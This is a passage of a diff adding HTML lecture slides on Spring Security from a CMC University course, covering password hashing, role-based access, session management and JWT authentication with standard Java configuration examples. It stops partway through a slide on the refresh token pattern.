@@ -1,0 +1,1968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lesson 07 - Spring Security</title>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../template.css">
+</head>
+<body>
+
+<!-- SLIDE 1 -->
+<section class="slide slide-title-page" style="background-image:url('../../shared/bg-title.png')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="title-content">
+    <h1>SPRING SECURITY</h1>
+    <p class="subtitle">Application Security with Spring Security, JWT & OAuth2</p>
+  </div>
+  <span class="slide-num" style="color:white;">1</span>
+  <span class="slide-author" style="color:rgba(255,255,255,0.8);">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>LESSON CONTENTS</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Part 1: Why Security is Needed?</h3>
+        <ul><li>Common threats</li><li>Spring Security overview</li><li>Key features</li></ul>
+        <h3>Part 2: Authentication & Authorization</h3>
+        <ul><li>Security Filter Chain</li><li>Authentication Manager & Provider</li><li>Roles & Authorities (RBAC)</li></ul>
+      </div>
+      <div class="col">
+        <h3>Part 3: JWT & OAuth2</h3>
+        <ul><li>JWT — JSON Web Token</li><li>Generating & Validating JWT</li><li>OAuth2 integration</li></ul>
+        <h3>Part 4: Practical Configuration</h3>
+        <ul><li>SecurityConfig class</li><li>HTTPS / SSL</li><li>CORS & CSRF</li></ul>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">2</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-section" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="section-content"><h1>WHY IS SECURITY NEEDED?</h1><p class="section-desc">Threats, Spring Security Overview, Key Features</p></div>
+  <span class="slide-num">3</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>WHY IS APPLICATION SECURITY NEEDED?</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Reasons:</h3>
+        <ul>
+          <li><strong>Authorized Access</strong> — only authorized users can access</li>
+          <li><strong>Protect Data</strong> — protect sensitive data (personal, financial)</li>
+          <li><strong>Mitigate Threats</strong> — mitigate SQL injection, XSS, CSRF</li>
+          <li><strong>Availability</strong> — protect application from DDoS, brute force</li>
+          <li><strong>Compliance</strong> — comply with GDPR, HIPAA, PCI DSS</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Common threats:</h3>
+        <table class="table-small">
+          <thead><tr><th>Threat</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SQL Injection</strong></td><td>Inject SQL via input</td></tr>
+            <tr><td><strong>XSS</strong></td><td>Inject scripts into web pages</td></tr>
+            <tr><td><strong>CSRF</strong></td><td>Forged request from another site</td></tr>
+            <tr><td><strong>Brute Force</strong></td><td>Continuously trying passwords</td></tr>
+            <tr><td><strong>Session Hijacking</strong></td><td>Stealing session ID</td></tr>
+            <tr><td><strong>Man-in-the-Middle</strong></td><td>Eavesdropping on transmitted data</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">4</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SPRING SECURITY — OVERVIEW</h2></div>
+  <div class="slide-body">
+    <p>A comprehensive security framework in the Spring ecosystem for Java applications. <a class="ref" href="https://spring.io/projects/spring-security" target="_blank">[spring.io]</a></p>
+    <div class="cards" style="gap:12px;">
+      <div class="card"><h4>Authentication</h4><p>Identity verification: username/password, JWT, OAuth2, LDAP</p></div>
+      <div class="card accent-orange"><h4>Authorization</h4><p>Access control: roles, permissions, attributes</p></div>
+      <div class="card accent-green"><h4>Password Management</h4><p>Secure hashing: BCrypt, PBKDF2, Argon2</p></div>
+      <div class="card accent-purple"><h4>CSRF Protection</h4><p>Prevent forged requests using unique tokens</p></div>
+    </div>
+    <div class="cards" style="gap:12px; margin-top:10px;">
+      <div class="card"><h4>Session Management</h4><p>Concurrent sessions, fixation protection</p></div>
+      <div class="card accent-orange"><h4>JWT & OAuth2</h4><p>Stateless authentication, third-party login</p></div>
+      <div class="card accent-green"><h4>Custom Rules</h4><p>Configure security for each endpoint and role</p></div>
+    </div>
+  </div>
+  <span class="slide-num">5</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-section" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="section-content"><h1>AUTHENTICATION & AUTHORIZATION</h1><p class="section-desc">Filter Chain — RBAC — SecurityConfig</p></div>
+  <span class="slide-num">6</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SPRING SECURITY FLOW</h2></div>
+  <div class="slide-body">
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><div class="step-content"><h4>Authentication Filter</h4><p>Chain of filters intercepts HTTP requests, applying security logic. E.g.: UsernamePasswordAuthenticationFilter, BasicAuthenticationFilter, CsrfFilter</p></div></div>
+      <div class="step"><div class="step-num" style="background:#ED7D31;">2</div><div class="step-content"><h4>Authentication Manager</h4><p>Delegates authentication to configured AuthenticationProviders</p></div></div>
+      <div class="step"><div class="step-num" style="background:#70AD47;">3</div><div class="step-content"><h4>Authentication Provider</h4><p>Handles authentication requests: validates credentials or tokens</p></div></div>
+      <div class="step"><div class="step-num" style="background:#7030A0;">4</div><div class="step-content"><h4>Granted Authority</h4><p>User's roles/permissions: ROLE_ADMIN, ROLE_USER, READ_PRIVILEGE</p></div></div>
+      <div class="step"><div class="step-num" style="background:#C00000;">5</div><div class="step-content"><h4>Security Context Holder</h4><p>Stores the security context (user details, authorities) throughout the session/request</p></div></div>
+    </div>
+  </div>
+  <span class="slide-num">7</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SPRING SECURITY ARCHITECTURE</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Core components:</h3>
+        <table class="table-small">
+          <thead><tr><th>Component</th><th>Role</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SecurityFilterChain</strong></td><td>Chain of security filters</td></tr>
+            <tr><td><strong>AuthenticationManager</strong></td><td>Coordinate authentication</td></tr>
+            <tr><td><strong>AuthenticationProvider</strong></td><td>Validate credentials</td></tr>
+            <tr><td><strong>UserDetailsService</strong></td><td>Load user from storage</td></tr>
+            <tr><td><strong>PasswordEncoder</strong></td><td>Hash &amp; verify passwords</td></tr>
+            <tr><td><strong>SecurityContextHolder</strong></td><td>Store authentication info</td></tr>
+            <tr><td><strong>GrantedAuthority</strong></td><td>Roles &amp; permissions</td></tr>
+            <tr><td><strong>AccessDecisionManager</strong></td><td>Authorize access</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="col">
+        <h3>Filter chain order:</h3>
+        <ol>
+          <li>SecurityContextPersistenceFilter</li>
+          <li>HeaderWriterFilter</li>
+          <li>CorsFilter</li>
+          <li>CsrfFilter</li>
+          <li>LogoutFilter</li>
+          <li>UsernamePasswordAuthenticationFilter</li>
+          <li>BearerTokenAuthenticationFilter (JWT)</li>
+          <li>RequestCacheAwareFilter</li>
+          <li>SecurityContextHolderAwareRequestFilter</li>
+          <li>AnonymousAuthenticationFilter</li>
+          <li>SessionManagementFilter</li>
+          <li>ExceptionTranslationFilter</li>
+          <li>FilterSecurityInterceptor</li>
+        </ol>
+        <p style="font-size:13px; color:#666;">Custom filters can be inserted at any position using <code>addFilterBefore()</code> or <code>addFilterAfter()</code>.</p>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">8</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>PASSWORD ENCODING — BCRYPT</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>NEVER</strong> store passwords in plain text. Must use a one-way <strong>hash function</strong> with salt.</p>
+        <h3>Algorithm comparison:</h3>
+        <table class="table-small">
+          <thead><tr><th>Algorithm</th><th>Secure?</th></tr></thead>
+          <tbody>
+            <tr><td>MD5</td><td>❌ Broken</td></tr>
+            <tr><td>SHA-1</td><td>❌ Broken</td></tr>
+            <tr><td>SHA-256</td><td>⚠️ Too fast, easy to brute force</td></tr>
+            <tr><td><strong>BCrypt</strong></td><td>✅ Recommended</td></tr>
+            <tr><td><strong>Argon2</strong></td><td>✅ Newest, strongest</td></tr>
+            <tr><td><strong>PBKDF2</strong></td><td>✅ FIPS approved</td></tr>
+          </tbody>
+        </table>
+        <h3>Why BCrypt?</h3>
+        <ul>
+          <li><strong>Automatic salt</strong> — prevents rainbow table attacks</li>
+          <li><strong>Adaptive cost</strong> — increase cost as CPUs get faster</li>
+          <li><strong>Slow by design</strong> — prevents brute force</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>BCrypt usage example:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+public class PasswordConfig {
+
+  @Bean
+  public PasswordEncoder passwordEncoder() {
+    // strength = 12 (cost factor)
+    return new BCryptPasswordEncoder(12);
+  }
+}
+
+@Service
+@RequiredArgsConstructor
+public class UserService {
+
+  private final PasswordEncoder encoder;
+  private final UserRepository userRepo;
+
+  public User register(RegisterDTO dto) {
+    User user = new User();
+    user.setEmail(dto.getEmail());
+    // Hash password before saving
+    user.setPassword(
+      encoder.encode(dto.getPassword()));
+    return userRepo.save(user);
+  }
+
+  public boolean login(String email, String pwd) {
+    User user = userRepo.findByEmail(email)
+      .orElseThrow();
+    return encoder.matches(pwd, user.getPassword());
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">9</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>USERDETAILSSERVICE — CUSTOM AUTHENTICATION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>UserDetailsService</strong> is the core interface for Spring Security to load user info from the database.</p>
+        <h3>Implementation:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+@RequiredArgsConstructor
+public class CustomUserDetailsService
+    implements UserDetailsService {
+
+  private final UserRepository userRepo;
+
+  @Override
+  public UserDetails loadUserByUsername(
+      String email)
+      throws UsernameNotFoundException {
+
+    User user = userRepo.findByEmail(email)
+      .orElseThrow(() ->
+        new UsernameNotFoundException(
+          "User not found: " + email));
+
+    return org.springframework.security
+      .core.userdetails.User.builder()
+      .username(user.getEmail())
+      .password(user.getPassword())
+      .authorities(getAuthorities(user))
+      .accountExpired(false)
+      .accountLocked(false)
+      .credentialsExpired(false)
+      .disabled(!user.isActive())
+      .build();
+  }
+}</pre>
+      </div>
+      <div class="col">
+        <h3>Custom UserDetails:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Data
+@AllArgsConstructor
+public class CustomUserDetails
+    implements UserDetails {
+
+  private User user;
+
+  @Override
+  public Collection&lt;? extends GrantedAuthority&gt;
+      getAuthorities() {
+    return List.of(new SimpleGrantedAuthority(
+      "ROLE_" + user.getRole().name()));
+  }
+
+  @Override
+  public String getPassword() {
+    return user.getPassword();
+  }
+
+  @Override
+  public String getUsername() {
+    return user.getEmail();
+  }
+
+  @Override public boolean isEnabled() {
+    return user.isActive();
+  }
+
+  // ... other methods
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">10</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>LDAP & ACTIVE DIRECTORY INTEGRATION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>LDAP</strong> (Lightweight Directory Access Protocol) — a standard for directory services. <strong>Active Directory</strong> is Microsoft's implementation. <a class="ref" href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol" target="_blank">[Wikipedia]</a></p>
+        <h3>When is LDAP needed?</h3>
+        <ul>
+          <li>Enterprise apps — users use AD accounts</li>
+          <li>Single Sign-On (SSO) across the organization</li>
+          <li>Centralized user management</li>
+          <li>Integration with existing infrastructure</li>
+        </ul>
+        <h3>Setup:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+&lt;dependency&gt;
+  &lt;groupId&gt;org.springframework
+    .security&lt;/groupId&gt;
+  &lt;artifactId&gt;
+    spring-security-ldap
+  &lt;/artifactId&gt;
+&lt;/dependency&gt;</pre>
+      </div>
+      <div class="col">
+        <h3>Configuration:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+@EnableWebSecurity
+public class LdapSecurityConfig {
+
+  @Bean
+  public SecurityFilterChain filterChain(
+      HttpSecurity http) throws Exception {
+    return http
+      .authorizeHttpRequests(auth -> auth
+        .anyRequest().fullyAuthenticated())
+      .formLogin(Customizer.withDefaults())
+      .build();
+  }
+
+  @Bean
+  public AuthenticationManager authManager(
+      BaseLdapPathContextSource contextSource) {
+    LdapBindAuthenticationManagerFactory factory
+      = new LdapBindAuthenticationManagerFactory(
+        contextSource);
+    factory.setUserDnPatterns("uid={0},ou=people");
+    factory.setUserSearchBase("ou=people");
+    factory.setUserSearchFilter("uid={0}");
+    return factory.createAuthenticationManager();
+  }
+
+  @Bean
+  public BaseLdapPathContextSource contextSource() {
+    LdapContextSource source =
+      new LdapContextSource();
+    source.setUrl("ldap://ldap.cmc.vn:389");
+    source.setBase("dc=cmc,dc=vn");
+    return source;
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">11</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>ROLES & AUTHORITIES (RBAC)</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Roles vs Authorities:</h3>
+        <table>
+          <thead><tr><th></th><th>Role</th><th>Authority</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Level</strong></td><td>Group of permissions (coarse)</td><td>Specific permission (fine-grained)</td></tr>
+            <tr><td><strong>Prefix</strong></td><td>ROLE_ADMIN</td><td>READ_USER, WRITE_USER</td></tr>
+            <tr><td><strong>Example</strong></td><td>ADMIN, USER, TEACHER</td><td>CREATE_COURSE, DELETE_USER</td></tr>
+          </tbody>
+        </table>
+        <h3>Annotations:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:12px;">
+@PreAuthorize("hasRole('ADMIN')")
+public void deleteUser(Long id) { ... }
+
+@PreAuthorize("hasAuthority('CREATE_COURSE')")
+public Course createCourse(CourseDTO dto) { ... }</pre>
+      </div>
+      <div class="col">
+        <h3>SecurityConfig:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+@EnableWebSecurity
+@EnableMethodSecurity
+public class SecurityConfig {
+
+  @Bean
+  public SecurityFilterChain filterChain(
+      HttpSecurity http) throws Exception {
+    http
+      .csrf(csrf -> csrf.disable())
+      .authorizeHttpRequests(auth -> auth
+        .requestMatchers("/api/auth/**")
+          .permitAll()
+        .requestMatchers("/api/admin/**")
+          .hasRole("ADMIN")
+        .anyRequest().authenticated()
+      )
+      .sessionManagement(s -> s
+        .sessionCreationPolicy(STATELESS))
+      .addFilterBefore(jwtFilter,
+        UsernamePasswordAuthFilter.class);
+    return http.build();
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">12</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>METHOD SECURITY ANNOTATIONS</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p>Security at the method level, not just URLs — provides more detailed control.</p>
+        <h3>Enable Method Security:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+@Configuration
+@EnableMethodSecurity(
+  prePostEnabled = true,
+  securedEnabled = true,
+  jsr250Enabled = true
+)
+public class SecurityConfig { }</pre>
+        <h3>Annotations:</h3>
+        <table class="table-small">
+          <thead><tr><th>Annotation</th><th>When it checks</th></tr></thead>
+          <tbody>
+            <tr><td><code>@PreAuthorize</code></td><td>Before the method runs</td></tr>
+            <tr><td><code>@PostAuthorize</code></td><td>After the method runs (checks return)</td></tr>
+            <tr><td><code>@PreFilter</code></td><td>Filters input collection</td></tr>
+            <tr><td><code>@PostFilter</code></td><td>Filters output collection</td></tr>
+            <tr><td><code>@Secured</code></td><td>Simple (roles only)</td></tr>
+            <tr><td><code>@RolesAllowed</code></td><td>JSR-250 standard</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="col">
+        <h3>Detailed examples:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+public class CourseService {
+
+  // ADMIN only
+  @PreAuthorize("hasRole('ADMIN')")
+  public void deleteCourse(Long id) { }
+
+  // ADMIN or TEACHER
+  @PreAuthorize(
+    "hasAnyRole('ADMIN','TEACHER')")
+  public Course createCourse(CourseDTO dto) { }
+
+  // Owner only
+  @PreAuthorize(
+    "@courseService.isOwner(#id, principal)")
+  public Course updateCourse(
+    Long id, CourseDTO dto) { }
+
+  // Filter output
+  @PostFilter(
+    "filterObject.published == true || " +
+    "filterObject.author == authentication.name")
+  public List&lt;Course&gt; getAll() { }
+
+  // Check return value
+  @PostAuthorize(
+    "returnObject.author == authentication.name")
+  public Course getMyCourse(Long id) { }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">13</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SESSION MANAGEMENT</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Stateless vs Stateful:</h3>
+        <table class="table-small">
+          <thead><tr><th></th><th>Stateful (Session)</th><th>Stateless (JWT)</th></tr></thead>
+          <tbody>
+            <tr><td>State storage</td><td>Server</td><td>Client (token)</td></tr>
+            <tr><td>Scale</td><td>Hard (sticky session)</td><td>Easy horizontal</td></tr>
+            <tr><td>Logout</td><td>Server deletes session</td><td>Client deletes token</td></tr>
+            <tr><td>Revoke</td><td>Immediate</td><td>Wait for expiration</td></tr>
+            <tr><td>Suitable for</td><td>Traditional web apps</td><td>REST API, SPA, mobile</td></tr>
+          </tbody>
+        </table>
+        <h3>Spring Security session config:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+http.sessionManagement(session -> session
+  // Stateless for REST API
+  .sessionCreationPolicy(
+    SessionCreationPolicy.STATELESS)
+
+  // Or with session
+  .maximumSessions(1)  // 1 user 1 session
+  .maxSessionsPreventsLogin(false)
+  .sessionFixation()
+    .migrateSession()  // Prevent fixation
+);</pre>
+      </div>
+      <div class="col">
+        <h3>Concurrent Session Control:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Bean
+public HttpSessionEventPublisher
+    httpSessionEventPublisher() {
+  return new HttpSessionEventPublisher();
+}
+
+http.sessionManagement(session -> session
+  .maximumSessions(1)
+  .expiredUrl("/login?expired")
+  .sessionRegistry(sessionRegistry()));
+
+@Bean
+public SessionRegistry sessionRegistry() {
+  return new SessionRegistryImpl();
+}</pre>
+        <h3>Force logout user:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+public class AdminService {
+
+  @Autowired
+  private SessionRegistry sessionRegistry;
+
+  public void forceLogout(String username) {
+    sessionRegistry.getAllPrincipals()
+      .stream()
+      .filter(p -> ((UserDetails) p)
+        .getUsername().equals(username))
+      .findFirst()
+      .ifPresent(principal -> {
+        sessionRegistry
+          .getAllSessions(principal, false)
+          .forEach(SessionInformation
+            ::expireNow);
+      });
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">14</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-section" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="section-content"><h1>JWT & OAUTH2</h1><p class="section-desc">Stateless authentication — Third-party login</p></div>
+  <span class="slide-num">15</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>JWT — JSON WEB TOKEN</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>JWT</strong> is a compact, self-contained token for secure data exchange. <a class="ref" href="https://en.wikipedia.org/wiki/JSON_Web_Token" target="_blank">[Wikipedia]</a></p>
+        <h3>JWT structure (3 parts):</h3>
+        <ul>
+          <li><strong>Header:</strong> algorithm (HS256), type (JWT)</li>
+          <li><strong>Payload:</strong> claims (sub, email, roles, exp)</li>
+          <li><strong>Signature:</strong> HMAC(header + payload, secret)</li>
+        </ul>
+        <h3>JWT flow:</h3>
+        <ol>
+          <li>User login → server verifies credentials</li>
+          <li>Server generates JWT → returns to client</li>
+          <li>Client stores JWT (localStorage/cookie)</li>
+          <li>Each request: client sends JWT in header <code>Authorization: Bearer &lt;token&gt;</code></li>
+          <li>Server validates JWT → allow/deny</li>
+        </ol>
+      </div>
+      <div class="col">
+        <h3>Generate JWT:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+public String generateToken(UserDetails user) {
+  return Jwts.builder()
+    .setSubject(user.getUsername())
+    .claim("roles", user.getAuthorities())
+    .setIssuedAt(new Date())
+    .setExpiration(new Date(
+      System.currentTimeMillis() + 86400000))
+    .signWith(SignatureAlgorithm.HS256, secret)
+    .compact();
+}</pre>
+        <h3>Validate JWT:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+public boolean validateToken(String token) {
+  try {
+    Jwts.parser()
+      .setSigningKey(secret)
+      .parseClaimsJws(token);
+    return true;
+  } catch (JwtException e) {
+    return false;
+  }
+}</pre>
+        <div class="ai-box">
+          <div class="ai-label">&#x2728; MODERN TRENDS</div>
+          <p>The project uses JWT for authentication between Angular (frontend) and Spring Boot (backend) — stateless, no server-side session needed.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">16</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>JWT AUTHENTICATION FILTER</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p>A filter that intercepts every request, checks for JWT in the header, and automatically authenticates the user.</p>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Component
+@RequiredArgsConstructor
+public class JwtAuthFilter
+    extends OncePerRequestFilter {
+
+  private final JwtService jwtService;
+  private final UserDetailsService userDetailsService;
+
+  @Override
+  protected void doFilterInternal(
+      HttpServletRequest request,
+      HttpServletResponse response,
+      FilterChain filterChain)
+      throws ServletException, IOException {
+
+    String authHeader = request
+      .getHeader("Authorization");
+
+    if (authHeader == null ||
+        !authHeader.startsWith("Bearer ")) {
+      filterChain.doFilter(request, response);
+      return;
+    }
+    // ... validate &amp; set context
+    filterChain.doFilter(request, response);
+  }
+}</pre>
+      </div>
+      <div class="col">
+        <h3>Validate & Set Context:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+String token = authHeader.substring(7);
+String email = jwtService
+  .extractUsername(token);
+
+if (email != null &&
+    SecurityContextHolder.getContext()
+      .getAuthentication() == null) {
+
+  UserDetails userDetails = userDetailsService
+    .loadUserByUsername(email);
+
+  if (jwtService.isTokenValid(
+      token, userDetails)) {
+
+    UsernamePasswordAuthenticationToken authToken
+      = new UsernamePasswordAuthenticationToken(
+        userDetails, null,
+        userDetails.getAuthorities());
+    authToken.setDetails(
+      new WebAuthenticationDetailsSource()
+        .buildDetails(request));
+
+    SecurityContextHolder.getContext()
+      .setAuthentication(authToken);
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">17</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>JWT SERVICE — TOKEN GENERATION & VALIDATION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>JwtService:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+public class JwtService {
+
+  @Value("${jwt.secret}")
+  private String secretKey;
+
+  @Value("${jwt.expiration}")
+  private long jwtExpiration;
+
+  public String generateToken(
+      UserDetails userDetails) {
+    return generateToken(
+      new HashMap&lt;&gt;(), userDetails);
+  }
+
+  public String generateToken(
+      Map&lt;String, Object&gt; extraClaims,
+      UserDetails userDetails) {
+    return Jwts.builder()
+      .setClaims(extraClaims)
+      .setSubject(userDetails.getUsername())
+      .setIssuedAt(new Date())
+      .setExpiration(new Date(
+        System.currentTimeMillis() + jwtExpiration))
+      .signWith(getSignInKey(),
+        SignatureAlgorithm.HS256)
+      .compact();
+  }
+}</pre>
+      </div>
+      <div class="col">
+        <h3>Validation:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+public String extractUsername(String token) {
+  return extractClaim(token, Claims::getSubject);
+}
+
+public boolean isTokenValid(String token,
+    UserDetails userDetails) {
+  String username = extractUsername(token);
+  return username.equals(
+    userDetails.getUsername())
+    &amp;&amp; !isTokenExpired(token);
+}
+
+private boolean isTokenExpired(String token) {
+  return extractExpiration(token).before(
+    new Date());
+}
+
+private Key getSignInKey() {
+  byte[] keyBytes = Decoders.BASE64
+    .decode(secretKey);
+  return Keys.hmacShaKeyFor(keyBytes);
+}</pre>
+        <h3>application.yml:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+jwt:
+  secret: ${JWT_SECRET}  # DO NOT hardcode!
+  expiration: 86400000   # 24 hours
+  refresh-expiration: 604800000  # 7 days</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">18</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>REFRESH TOKEN PATTERN</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p>Problem: Access Token should have a short lifespan (15 minutes) for security, but users don't want to log in repeatedly → solution: <strong>Refresh Token</strong>.</p>
+        <h3>How it works:</h3>
+        <ul>
+          <li>Login → server returns 2 tokens: <strong>Access</strong> (15 min) + <strong>Refresh</strong> (7 days)</li>
+          <li>Client stores refresh token securely (httpOnly cookie)</li>
+          <li>When access token expires → client sends refresh token to get a new access token</li>
+          <li>Refresh token can be revoked server-side</li>
+        </ul>
+        <h3>Benefits:</h3>
+        <ul>
+          <li>Short access token → reduced risk if leaked</li>
+          <li>Good UX — no need to log in again</li>
+          <li>Server can logout user (revoke refresh)</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Refresh endpoint:</h3>
